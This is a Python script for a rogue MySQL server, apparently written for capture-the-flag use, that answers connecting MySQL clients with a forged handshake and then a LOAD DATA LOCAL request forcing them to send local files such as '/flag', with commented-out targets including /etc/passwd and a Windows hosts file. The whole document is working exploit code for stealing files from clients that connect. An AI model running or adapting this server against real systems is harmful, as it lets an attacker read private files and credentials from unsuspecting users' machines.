import random
import socket
import time
from threading import Thread

debug_mode = False
ip = "0.0.0.0"
port = 3307

files = {
    b"/flag",
    # b"/etc/passwd",
    # b"C:/Windows/System32/drivers/etc/hosts",
    # b"D:/flag"
}

socket_server = None
conn_pool = {}


def init():
    global socket_server
    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_server.bind((ip, port))
    socket_server.listen(5)
    print(f'[+] Listening on: {ip}:{port}')


def rouge_server():
    while True:
        conn, address = socket_server.accept()
        new_thread = Thread(target=readfile, args=(conn, address))
        new_thread.setDaemon(True)
        new_thread.start()


def readfile(conn, address):
    print(f'[!] Conn from: {address}')

    greetData = b''.join([
        b'\x0a',  # Protocol
        b'Dig2-Rogue-Mysql' + b'\x00',  # version
        b'\x03\x00\x00\x00',  # Thread ID
        b'Dig2Hack' + b'\x00',  # Salt
        b'\xff\xf7',  # close SSL
        b'\x21',  # Language
        b'\x02\x00',  # Server Status
        b'\xff\x81',
        b'\x15',
        b'\x00' * 10,  # unused
        b'HackedByDig2' + b'\x00',  # Salt
        b'mysql_native_password' + b"\x00"
    ])

    greetData = (chr(len(greetData)).encode() + b'\x00' * 3 + greetData)

    conn.sendall(greetData)
    rec = conn.recv(1024)

    if debug_mode:
        print(rec)
    print("[-] auth okay")

    conn.sendall(b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
    rec = conn.recv(1024)

    if debug_mode:
        print(rec)
    filename = random.choice(list(files))
    print(f"[-] reading {filename} from {address[0]}")

    data = chr(len(filename) + 1).encode() + b"\x00\x00\x01\xfb" + filename

    conn.sendall(data)
    content = conn.recv(1024)
    print(content)

    print("[!] quit", end='\n\n')
    conn.close()


if __name__ == '__main__':
    init()

    thread = Thread(target=rouge_server)
    thread.setDaemon(True)
    thread.start()

    while True:
        time.sleep(1)
